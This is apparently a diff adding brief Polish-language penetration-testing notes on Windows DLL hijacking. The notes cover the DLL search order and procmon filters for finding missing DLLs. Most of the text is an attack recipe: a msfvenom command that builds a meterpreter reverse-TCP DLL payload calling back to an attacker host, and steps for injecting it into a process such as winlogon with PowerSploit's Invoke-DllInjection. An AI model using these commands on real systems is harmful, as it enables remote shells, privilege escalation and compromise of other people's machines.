@@ -1,0 +1,33 @@
+Hierarchia wyszukiwania pliku przez system:
+1. Folder aplikacji
+2. Folder roboczy
+3. C:\Windows\System32\*.dll
+4. C:\Windows\System\*.dll
+5. %windir%
+6. Na koniec przeszukuje zmienne srodowiskowe
+
+
+Program procmon (sysinternals):
+Za pomoca programu mozemy obserwowac uruchomione programy i zobaczyc z jakich dll kozystaja.
+Dla przykladu odpalimy program biginfo (sysinternals) odfiltrujemy nazwe i widac:
+
+
+
+
+Generalnie ustawienie filtrow na:
+→ Path - ends with - *.dll
+→ result - is - name not found
+Powinno wyswietlic dll podatne na ataki.
+
+Msfvenom payload dll:
+→ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o <nazwa_biblioteki>.dll
+
+
+Skrypt do wstrzykiwania dll:
+→ ladujemy skrypt do powershella
+   ⇒ https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1
+→ komenda
+   ⇒ ps
+→ wyswietli procesy szukamy procesu np. winlogon (payload z msfvenoma)
+   ⇒ Invoke-DLLInjection -ProcessID <ID_winlogon> -DLL <nazwa_biblioteki>.dll
+→ payload powinien sie wykonac
